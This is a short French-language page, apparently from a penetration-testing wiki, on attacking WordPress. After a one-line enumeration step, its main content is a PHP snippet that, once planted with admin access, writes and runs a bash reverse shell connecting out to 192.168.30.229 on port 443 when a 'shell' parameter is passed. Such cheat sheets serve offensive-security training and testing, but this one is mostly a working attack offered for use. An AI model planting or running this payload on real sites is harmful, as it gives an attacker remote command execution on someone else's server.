---
title: WordPress
permalink: /WordPress/
---

# WordPress

Enumeration
-----------

Lors de cette étape on va chercher à identifier les plugins vulnérables présents sur le wordpress ainsi que les utilisateurs présents.

Exploitation
------------

### Reverse Shell

Avec un compte admin il est possible d'obtenir un reverse shell:

``` php
<?php
if(isset($_GET["shell"]))
{
    system("echo 'bash -i >& /dev/tcp/192.168.30.229/443 0>&1' > /tmp/shell.sh");
    system("bash /tmp/shell.sh");
}
?>
```

[Category:Technologies](/Category:Technologies "wikilink")
